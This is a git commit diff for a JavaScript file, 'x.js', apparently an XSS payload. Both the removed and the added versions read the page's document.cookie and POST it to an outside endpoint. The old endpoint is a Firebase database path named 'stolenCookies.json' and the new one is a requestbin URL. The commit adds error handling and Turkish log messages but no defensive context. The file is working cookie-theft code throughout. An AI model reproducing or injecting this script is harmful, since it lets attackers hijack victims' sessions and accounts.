bebe839f762d83796bf0667faf772f35445628b9
ibo442544 <92678011+ibo442544@users.noreply.github.com>
2025-05-17 12:36:08 +0300

    x.js

--- x.js
+++ x.js
@@ -1,14 +1,10 @@
-<script>
-var cookies = document.cookie;
-var firebaseUrl = "https://yaflfest-970fa-default-rtdb.firebaseio.com/stolenCookies.json";
+var cookies = document.cookie;  // ya da istediğin test verisi
+var binUrl = "https://requestbin.com/r/abcd1234xyz";
 
 var xhr = new XMLHttpRequest();
-xhr.open("POST", firebaseUrl, true);
+xhr.open("POST", binUrl, true);
 xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-xhr.send(JSON.stringify({ cookies: cookies }));
-var xhr = new XMLHttpRequest();
-xhr.open("POST", firebaseUrl, true);
-xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
 xhr.onload = function() {
   if (xhr.status >= 200 && xhr.status < 300) {
     console.log("Başarılı:", xhr.responseText);
@@ -16,8 +12,9 @@ xhr.onload = function() {
     console.error("Hata:", xhr.status, xhr.statusText);
   }
 };
+
 xhr.onerror = function() {
   console.error("İstek sırasında bir hata oluştu.");
 };
+
 xhr.send(JSON.stringify({ cookies: cookies }));
-</script>
